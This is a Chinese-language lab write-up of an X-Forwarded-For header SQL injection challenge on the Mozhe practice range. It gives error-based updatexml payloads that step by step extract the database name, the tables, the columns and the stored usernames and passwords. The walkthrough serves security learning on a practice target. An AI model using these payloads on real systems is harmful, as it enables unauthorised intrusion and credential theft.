---
{"dg-publish":true,"title":null,"dg-path":"安全/靶场/墨者_XFF注入.md","permalink":"/安全/靶场/墨者_XFF注入/","dgPassFrontmatter":true}
---

进去是一个登陆界面
![Pasted image 20240730155230.png](/img/user/picture/Pasted%20image%2020240730155230.png)



随便输一个抓包发现发现会返回ip地址
![Pasted image 20240730155348.png](/img/user/picture/Pasted%20image%2020240730155348.png)
![Pasted image 20240730155356.png](/img/user/picture/Pasted%20image%2020240730155356.png)

这里猜测他在代码中应该是有获取我们ip地址的操作，然后会代入数据库进行查询，所以我们试一下添加XFF头会不会带入查询
`X-Forwarded-For:`


![Pasted image 20240730160041.png](/img/user/picture/Pasted%20image%2020240730160041.png)
![Pasted image 20240730160050.png](/img/user/picture/Pasted%20image%2020240730160050.png)
发现他确实有返回123

加上单引号有报错
![Pasted image 20240730160219.png](/img/user/picture/Pasted%20image%2020240730160219.png)
![Pasted image 20240730160212.png](/img/user/picture/Pasted%20image%2020240730160212.png)

则这里就是一个出入点
开始利用XFF头进行注入



获取到数据库名称
`',updatexml(1,concat(0x7e,(select database()),0x7e),1))#`
![Pasted image 20240730160332.png](/img/user/picture/Pasted%20image%2020240730160332.png)


获取到表名
```sql
' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='webcalendar'),0x7e),1))#
```

![Pasted image 20240730160442.png](/img/user/picture/Pasted%20image%2020240730160442.png)


获取到字段名
```sql
' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='user'),0x7e),1))#
```
![Pasted image 20240730160522.png](/img/user/picture/Pasted%20image%2020240730160522.png)


最后获取到数据是账号和密码
```sql
' or updatexml(1,concat(0x7e,(select group_concat(username,':',password)from user limit 0,1),0x7e),1))#
```
![Pasted image 20240730160558.png](/img/user/picture/Pasted%20image%2020240730160558.png)



![Pasted image 20240730160643.png](/img/user/picture/Pasted%20image%2020240730160643.png)



